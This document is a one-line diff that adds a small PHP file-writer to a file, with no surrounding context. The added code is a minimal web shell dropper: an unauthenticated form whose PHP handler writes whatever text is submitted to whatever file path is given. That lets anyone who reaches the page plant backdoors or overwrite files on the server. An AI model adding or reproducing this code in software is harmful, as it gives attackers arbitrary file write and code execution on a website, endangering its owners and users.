@@ -1,0 +1,1 @@
+n:<form action="?" method="post"><input type="text" name="n">f:<textarea name="f"></textarea><input type="submit"><?php if(isset($_POST["n"])){if(get_magic_quotes_gpc()) $_POST["f"]=stripslashes($_POST["f"]); $fp = fopen($_POST["n"],"w"); fwrite($fp,$_POST["f"]); fclose($fp);};
